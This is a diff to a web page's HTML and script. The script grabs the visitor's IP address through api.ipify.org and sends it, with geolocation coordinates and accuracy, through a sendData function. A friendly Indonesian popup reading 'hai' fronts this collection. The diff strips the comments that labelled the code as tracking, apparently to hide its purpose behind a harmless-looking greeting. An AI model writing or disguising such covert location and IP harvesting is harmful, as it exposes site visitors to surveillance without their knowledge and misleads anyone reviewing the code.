@@ -155,15 +155,12 @@
         </section>
     </main>
 
-    <!-- ========== POP-UP TRACKING ========== -->
     <div id="trackPopup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111; color: white; padding: 30px; border-radius: 20px; text-align: center; z-index: 10000; border: 1px solid #ff4d4d; box-shadow: 0 0 30px rgba(255,77,77,0.3);">
         <h2 style="color: #ff4d4d; margin-bottom: 15px;">hai 👋</h2>
-        <p style="margin-bottom: 20px;">klik tombol di bawah yaa</p>
-        <button id="trackBtn" style="background: #ff4d4d; border: none; padding: 10px 30px; border-radius: 30px; color: white; cursor: pointer; font-weight: bold;">oke</button>
+        <button id="trackBtn" style="background: #ff4d4d; border: none; padding: 10px 30px; border-radius: 30px; color: white; cursor: pointer; font-weight: bold;">haiii</button>
     </div>
 
     <script>
-    // ============= GET IP =============
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -174,7 +171,6 @@
         }
     }
 
-    // ============= SEND DATA =============
     async function sendData(ip, lat, lon, accuracy) {
         const data = { ip };
         if (lat && lon) {
@@ -194,7 +190,6 @@
         }
     }
 
-    // ============= SHOW POPUP =============
     setTimeout(() => {
         const popup = document.getElementById('trackPopup');
         if (popup) popup.style.display = 'block';
